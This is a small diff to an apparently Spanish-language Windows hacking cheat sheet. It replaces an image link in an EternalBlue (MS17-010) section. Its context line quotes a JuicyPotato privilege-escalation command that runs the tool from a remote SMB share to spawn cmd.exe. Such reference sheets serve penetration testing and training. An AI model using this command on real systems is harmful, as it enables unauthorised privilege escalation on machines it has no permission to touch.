@@ -141,7 +141,7 @@ $  \\[IP]\smbFolder\JuicyPotato.exe -l 1337 -p C:\Windows\System32\cmd.exe -a " 
 
 #### EternalBlue (MS17-010).
 
-![Desktop View]({{ "/assets/img/Posts/Windows-Cheet-Sheet/ETERNALBLUE.jpg" }}) 
+![enter image description here](https://i0.wp.com/www.api-ux.com/wp-content/uploads/2019/05/eternal.jpg?fit=1024,538&ssl=1)
 
 `Explotación de EternalBlue #1`
 
